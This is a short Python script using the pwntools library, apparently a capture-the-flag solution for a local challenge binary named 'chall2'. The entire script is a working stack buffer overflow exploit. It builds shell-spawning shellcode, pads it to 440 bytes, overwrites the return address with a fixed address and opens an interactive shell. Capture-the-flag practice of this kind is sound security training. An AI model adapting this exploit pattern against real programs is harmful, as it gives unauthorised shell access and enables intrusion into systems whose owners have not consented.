from pwn import *

p = process('./chall2')
elf = context.binary = ELF('./chall2')


payload = asm(shellcraft.sh())
payload = payload.ljust(440,b"O")
payload += p64(0x00000000004010ac)

p.sendline(payload)


p.interactive()